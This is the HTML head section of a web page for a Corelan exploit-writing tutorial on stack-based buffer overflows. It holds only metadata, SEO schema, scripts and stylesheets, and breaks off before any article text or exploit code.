<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US" prefix="og: https://ogp.me/ns#" class="pum-open pum-open-overlay-disabled pum-open-scrollable"><head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8">
<title>Exploit writing tutorial part 2 : Stack Based Overflows – jumping to shellcode | Corelan Cybersecurity ResearchCorelan Cybersecurity Research</title>
<link rel="stylesheet" href="https://www.corelan.be/wp-content/themes/corelan/style.css" type="text/css" media="screen">
<!--[if IE 6]><link rel="stylesheet" href="https://www.corelan.be/wp-content/themes/corelan/style.ie6.css" type="text/css" media="screen" /><![endif]-->
<!--[if IE 7]><link rel="stylesheet" href="https://www.corelan.be/wp-content/themes/corelan/style.ie7.css" type="text/css" media="screen" /><![endif]-->
<link rel="pingback" href="https://www.corelan.be/xmlrpc.php">

		<!-- All in One SEO 4.6.4 - aioseo.com -->
		<meta name="description" content="Where do you want to jmp today ? In one of my previous posts (part 1 of writing stack based buffer overflow exploits), I have explained the basisc about discovering a vulnerability and using that information to build a working exploit. In the example I have used in that post, we have seen that ESP">
		<meta name="robots" content="max-image-preview:large">
		<meta name="keywords" content="41414141,add esp,blind return,buffer,buffer overflow,bytes,dll,eip,findjmp,jmp,jmp esp,jumpcode,metasploit,nop,opcode,pop,pop pop ret,push ret,pwned,reg + offset,ret,shellcode,stack,001_security,exploit writing tutorials,exploits">
		<link rel="canonical" href="https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/">
		<meta name="generator" content="All in One SEO (AIOSEO) 4.6.4">
		<meta property="og:locale" content="en_US">
		<meta property="og:site_name" content="Corelan Team">
		<meta property="og:type" content="article">
		<meta property="og:title" content="Exploit writing tutorial part 2 : Stack Based Overflows – jumping to shellcode | Corelan Cybersecurity Research">
		<meta property="og:description" content="Where do you want to jmp today ? In one of my previous posts (part 1 of writing stack based buffer overflow exploits), I have explained the basisc about discovering a vulnerability and using that information to build a working exploit. In the example I have used in that post, we have seen that ESP">
		<meta property="og:url" content="https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/">
		<meta property="og:image" content="https://www.corelan.be/wp-content/uploads/2018/06/corelan-gcv-small.jpg">
		<meta property="og:image:secure_url" content="https://www.corelan.be/wp-content/uploads/2018/06/corelan-gcv-small.jpg">
		<meta property="og:image:width" content="300">
		<meta property="og:image:height" content="294">
		<meta property="article:published_time" content="2009-07-23T19:19:14+00:00">
		<meta property="article:modified_time" content="2015-12-01T10:46:55+00:00">
		<meta property="article:publisher" content="https://www.facebook.com/corelanconsulting">
		<meta name="twitter:card" content="summary">
		<meta name="twitter:site" content="@corelanconsult">
		<meta name="twitter:title" content="Exploit writing tutorial part 2 : Stack Based Overflows – jumping to shellcode | Corelan Cybersecurity Research">
		<meta name="twitter:description" content="Where do you want to jmp today ? In one of my previous posts (part 1 of writing stack based buffer overflow exploits), I have explained the basisc about discovering a vulnerability and using that information to build a working exploit. In the example I have used in that post, we have seen that ESP">
		<meta name="twitter:image" content="https://www.corelan.be/wp-content/uploads/2018/06/corelan-gcv-small.jpg">
		<meta name="google" content="nositelinkssearchbox">
		<script src="https://pagead2.googlesyndication.com/pagead/managed/js/adsense/m202406110101/reactive_library_fy2021.js"></script><script src="https://pagead2.googlesyndication.com/pagead/managed/js/adsense/m202406110101/show_ads_impl_with_ama_fy2021.js?client=ca-pub-8134501503628637&amp;plah=www.corelan.be&amp;aplac=true"></script><script type="text/javascript" async="" src="https://ssl.google-analytics.com/ga.js"></script><script type="application/ld+json" class="aioseo-schema">
			{"@context":"https:\/\/schema.org","@graph":[{"@type":"Article","@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/23\/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2\/#article","name":"Exploit writing tutorial part 2 : Stack Based Overflows \u2013 jumping to shellcode | Corelan Cybersecurity Research","headline":"Exploit writing tutorial part 2 : Stack Based Overflows &#8211; jumping to shellcode","author":{"@id":"https:\/\/www.corelan.be\/index.php\/author\/admin1\/#author"},"publisher":{"@id":"https:\/\/www.corelan.be\/#organization"},"image":{"@type":"ImageObject","url":"\/wp-content\/uploads\/2009\/07\/image_thumb19.png","@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/23\/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2\/#articleImage"},"datePublished":"2009-07-23T21:19:14+02:00","dateModified":"2015-12-01T11:46:55+01:00","inLanguage":"en-US","commentCount":15,"mainEntityOfPage":{"@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/23\/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2\/#webpage"},"isPartOf":{"@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/23\/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2\/#webpage"},"articleSection":"001_Security, Exploit Writing Tutorials, Exploits, 41414141, add esp, blind return, buffer, buffer overflow, bytes, dll, eip, findjmp, jmp, jmp esp, jumpcode, metasploit, nop, opcode, pop, pop pop ret, push ret, pwned, reg + offset, ret, shellcode, stack"},{"@type":"BreadcrumbList","@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/23\/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2\/#breadcrumblist","itemListElement":[{"@type":"ListItem","@id":"https:\/\/www.corelan.be\/#listItem","position":1,"name":"Home","item":"https:\/\/www.corelan.be\/","nextItem":"https:\/\/www.corelan.be\/index.php\/2009\/#listItem"},{"@type":"ListItem","@id":"https:\/\/www.corelan.be\/index.php\/2009\/#listItem","position":2,"name":"2009","item":"https:\/\/www.corelan.be\/index.php\/2009\/","nextItem":"https:\/\/www.corelan.be\/index.php\/2009\/07\/#listItem","previousItem":"https:\/\/www.corelan.be\/#listItem"},{"@type":"ListItem","@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/#listItem","position":3,"name":"July","item":"https:\/\/www.corelan.be\/index.php\/2009\/07\/","nextItem":"https:\/\/www.corelan.be\/index.php\/2009\/07\/23\/#listItem","previousItem":"https:\/\/www.corelan.be\/index.php\/2009\/#listItem"},{"@type":"ListItem","@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/23\/#listItem","position":4,"name":"23","item":"https:\/\/www.corelan.be\/index.php\/2009\/07\/23\/","nextItem":"https:\/\/www.corelan.be\/index.php\/2009\/07\/23\/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2\/#listItem","previousItem":"https:\/\/www.corelan.be\/index.php\/2009\/07\/#listItem"},{"@type":"ListItem","@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/23\/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2\/#listItem","position":5,"name":"Exploit writing tutorial part 2 : Stack Based Overflows - jumping to shellcode","previousItem":"https:\/\/www.corelan.be\/index.php\/2009\/07\/23\/#listItem"}]},{"@type":"Organization","@id":"https:\/\/www.corelan.be\/#organization","name":"Corelan Consulting","description":":: Knowledge is not an object, it's a flow ::","url":"https:\/\/www.corelan.be\/","telephone":"+32477681000","logo":{"@type":"ImageObject","url":"\/wp-content\/uploads\/2018\/06\/corelan-gcv-small.jpg","@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/23\/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2\/#organizationLogo"},"image":{"@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/23\/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2\/#organizationLogo"},"sameAs":["https:\/\/www.instagram.com\/corelanconsulting","https:\/\/www.linkedin.com\/company\/corelanconsulting"]},{"@type":"Person","@id":"https:\/\/www.corelan.be\/index.php\/author\/admin1\/#author","url":"https:\/\/www.corelan.be\/index.php\/author\/admin1\/","name":"Peter Van Eeckhoutte (corelanc0d3r)","image":{"@type":"ImageObject","@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/23\/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2\/#authorImage","url":"https:\/\/secure.gravatar.com\/avatar\/c974115f14c4626034731347d72cf10f?s=96&d=mm&r=x","width":96,"height":96,"caption":"Peter Van Eeckhoutte (corelanc0d3r)"}},{"@type":"WebPage","@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/23\/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2\/#webpage","url":"https:\/\/www.corelan.be\/index.php\/2009\/07\/23\/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2\/","name":"Exploit writing tutorial part 2 : Stack Based Overflows \u2013 jumping to shellcode | Corelan Cybersecurity Research","description":"Where do you want to jmp today ? In one of my previous posts (part 1 of writing stack based buffer overflow exploits), I have explained the basisc about discovering a vulnerability and using that information to build a working exploit. In the example I have used in that post, we have seen that ESP","inLanguage":"en-US","isPartOf":{"@id":"https:\/\/www.corelan.be\/#website"},"breadcrumb":{"@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/23\/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2\/#breadcrumblist"},"author":{"@id":"https:\/\/www.corelan.be\/index.php\/author\/admin1\/#author"},"creator":{"@id":"https:\/\/www.corelan.be\/index.php\/author\/admin1\/#author"},"datePublished":"2009-07-23T21:19:14+02:00","dateModified":"2015-12-01T11:46:55+01:00"},{"@type":"WebSite","@id":"https:\/\/www.corelan.be\/#website","url":"https:\/\/www.corelan.be\/","name":"Corelan Cybersecurity Research","description":":: Knowledge is not an object, it's a flow ::","inLanguage":"en-US","publisher":{"@id":"https:\/\/www.corelan.be\/#organization"}}]}
		</script>
		<!-- All in One SEO -->

<link rel="dns-prefetch" href="//stats.wp.com">
<link rel="dns-prefetch" href="//jetpack.wordpress.com">
<link rel="dns-prefetch" href="//s0.wp.com">
<link rel="dns-prefetch" href="//public-api.wordpress.com">
<link rel="dns-prefetch" href="//0.gravatar.com">
<link rel="dns-prefetch" href="//1.gravatar.com">
<link rel="dns-prefetch" href="//2.gravatar.com">
<link rel="dns-prefetch" href="//www.googletagmanager.com">
<link rel="dns-prefetch" href="//pagead2.googlesyndication.com">
<link rel="alternate" type="application/rss+xml" title="Corelan Cybersecurity Research » Feed" href="https://www.corelan.be/index.php/feed/">
<link rel="alternate" type="application/rss+xml" title="Corelan Cybersecurity Research » Comments Feed" href="https://www.corelan.be/index.php/comments/feed/">
<link rel="alternate" type="application/rss+xml" title="Corelan Cybersecurity Research » Exploit writing tutorial part 2 : Stack Based Overflows – jumping to shellcode Comments Feed" href="https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/feed/">
		<!-- This site uses the Google Analytics by MonsterInsights plugin v8.27.0 - Using Analytics tracking - https://www.monsterinsights.com/ -->
		<!-- Note: MonsterInsights is not currently configured on this site. The site owner needs to authenticate with Google Analytics in the MonsterInsights settings panel. -->
					<!-- No tracking code set -->
				<!-- / Google Analytics by MonsterInsights -->
		<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.corelan.be\/wp-includes\/js\/wp-emoji-release.min.js?ver=81f1e4891736f11093e8f14f84539862"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id="wp-emoji-styles-inline-css" type="text/css">

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel="stylesheet" id="wp-block-library-css" href="https://www.corelan.be/wp-includes/css/dist/block-library/style.min.css?ver=81f1e4891736f11093e8f14f84539862" type="text/css" media="all">
<style id="wp-block-library-inline-css" type="text/css">
.has-text-align-justify{text-align:justify;}
</style>
<link rel="stylesheet" id="mediaelement-css" href="https://www.corelan.be/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css?ver=4.2.17" type="text/css" media="all">
<link rel="stylesheet" id="wp-mediaelement-css" href="https://www.corelan.be/wp-includes/js/mediaelement/wp-mediaelement.min.css?ver=81f1e4891736f11093e8f14f84539862" type="text/css" media="all">
<style id="jetpack-sharing-buttons-style-inline-css" type="text/css">
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id="classic-theme-styles-inline-css" type="text/css">
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id="global-styles-inline-css" type="text/css">
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}body .is-layout-grid{display: grid;}body .is-layout-grid > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
</style>
<link rel="stylesheet" id="cptch_stylesheet-css" href="https://www.corelan.be/wp-content/plugins/captcha/css/front_end_style.css?ver=4.4.5" type="text/css" media="all">
<link rel="stylesheet" id="dashicons-css" href="https://www.corelan.be/wp-includes/css/dashicons.min.css?ver=81f1e4891736f11093e8f14f84539862" type="text/css" media="all">
<link rel="stylesheet" id="cptch_desktop_style-css" href="https://www.corelan.be/wp-content/plugins/captcha/css/desktop_style.css?ver=4.4.5" type="text/css" media="all">
<link rel="stylesheet" id="wp-downloadmanager-css" href="https://www.corelan.be/wp-content/plugins/wp-downloadmanager/download-css.css?ver=1.68.8" type="text/css" media="all">
<link rel="stylesheet" id="wpel-style-css" href="https://www.corelan.be/wp-content/plugins/wp-external-links/public/css/wpel.css?ver=2.60" type="text/css" media="all">
<link rel="stylesheet" id="wp-pagenavi-css" href="https://www.corelan.be/wp-content/plugins/wp-pagenavi/pagenavi-css.css?ver=2.70" type="text/css" media="all">
<link rel="stylesheet" id="thickbox-css" href="https://www.corelan.be/wp-includes/js/thickbox/thickbox.css?ver=81f1e4891736f11093e8f14f84539862" type="text/css" media="all">
<link rel="stylesheet" id="auto-thickbox-css" href="https://www.corelan.be/wp-content/plugins/auto-thickbox/css/styles-pre39.css?ver=20140420" type="text/css" media="all">
<link rel="stylesheet" id="yarpp-thumbnails-css" href="https://www.corelan.be/wp-content/plugins/yet-another-related-posts-plugin/style/styles_thumbnails.css?ver=5.30.10" type="text/css" media="all">
<style id="yarpp-thumbnails-inline-css" type="text/css">
.yarpp-thumbnails-horizontal .yarpp-thumbnail {width: 130px;height: 170px;margin: 5px;margin-left: 0px;}.yarpp-thumbnail > img, .yarpp-thumbnail-default {width: 120px;height: 120px;margin: 5px;}.yarpp-thumbnails-horizontal .yarpp-thumbnail-title {margin: 7px;margin-top: 0px;width: 120px;}.yarpp-thumbnail-default > img {min-height: 120px;min-width: 120px;}
</style>
<link rel="stylesheet" id="popup-maker-site-css" href="//www.corelan.be/wp-content/uploads/33a0700595809ce19c4dce1ddabf5e24.css?generated=1716470310&amp;ver=1.19.0" type="text/css" media="all">
<link rel="stylesheet" id="moove_gdpr_frontend-css" href="https://www.corelan.be/wp-content/plugins/gdpr-cookie-compliance/dist/styles/gdpr-main.css?ver=4.15.1" type="text/css" media="all">
<style id="moove_gdpr_frontend-inline-css" type="text/css">
#moove_gdpr_cookie_modal,#moove_gdpr_cookie_info_bar,.gdpr_cookie_settings_shortcode_content{font-family:Nunito,sans-serif}#moove_gdpr_save_popup_settings_button{background-color:#373737;color:#fff}#moove_gdpr_save_popup_settings_button:hover{background-color:#000}#moove_gdpr_cookie_info_bar .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content a.mgbutton,#moove_gdpr_cookie_info_bar .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content button.mgbutton{background-color:#0c4da2}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-footer-content .moove-gdpr-button-holder a.mgbutton,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-footer-content .moove-gdpr-button-holder button.mgbutton,.gdpr_cookie_settings_shortcode_content .gdpr-shr-button.button-green{background-color:#0c4da2;border-color:#0c4da2}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-footer-content .moove-gdpr-button-holder a.mgbutton:hover,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-footer-content .moove-gdpr-button-holder button.mgbutton:hover,.gdpr_cookie_settings_shortcode_content .gdpr-shr-button.button-green:hover{background-color:#fff;color:#0c4da2}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-close i,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-close span.gdpr-icon{background-color:#0c4da2;border:1px solid #0c4da2}#moove_gdpr_cookie_info_bar span.change-settings-button.focus-g,#moove_gdpr_cookie_info_bar span.change-settings-button:focus,#moove_gdpr_cookie_info_bar button.change-settings-button.focus-g,#moove_gdpr_cookie_info_bar button.change-settings-button:focus{-webkit-box-shadow:0 0 1px 3px #0c4da2;-moz-box-shadow:0 0 1px 3px #0c4da2;box-shadow:0 0 1px 3px #0c4da2}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-close i:hover,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-close span.gdpr-icon:hover,#moove_gdpr_cookie_info_bar span[data-href]>u.change-settings-button{color:#0c4da2}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li.menu-item-selected a 